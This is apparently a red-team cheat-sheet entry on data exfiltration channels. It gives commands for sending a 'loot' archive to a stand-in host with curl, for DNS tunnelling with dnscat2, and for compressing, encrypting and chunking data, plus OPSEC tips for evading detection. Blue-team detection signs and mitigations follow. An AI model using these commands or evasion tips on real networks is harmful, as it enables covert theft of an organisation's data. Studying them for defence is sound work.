---
title: "Data exfiltration channels"
category: "red-team"
tags: ["exfiltration", "data-theft"]
platform: "agnostic"
mitre: ["T1041", "T1048"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Exfiltration channels

## TL;DR
Getting data out through covert channels: DNS, HTTPS to trusted services, ICMP, the C2 channel. Compress + encrypt + chunk.

## Techniques
```bash
# HTTPS to a trusted service (blends in)
curl -X POST --data-binary @loot.zip https://storage.example.com/up

# DNS tunneling (small chunks in subdomains)
# iodine / dnscat2
dnscat2-server corp.local
dnscat2 --dns server=10.10.14.1,domain=corp.local

# ICMP
# hping3 / ptunnel to smuggle in the echo payload

# Prep: compress + encrypt + chunk
tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -k 'key' | split -b 1M - chunk_
```

## OPSEC
- Throttle (bandwidth limit), business hours, trusted domains/CDNs.
- Avoid large single transfers — spread over time.

## Detection (Blue Team)
```text
DNS   – long/random subdomains, high volume of TXT/NULL, one host->many queries
HTTPS – large upload to fresh/unusual domains, outbound volume anomaly
ICMP  – unusually large echoes with payload
DLP   – sensitive data patterns (PII/PAN) in outbound traffic
```

## Mitigation / Hardening
- DLP, egress filtering, an inspecting and logging proxy.
- Restrict outbound DNS to internal resolvers; alert on tunneling.
- Block categories/CDNs not used for business.

## Sources
- [MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)
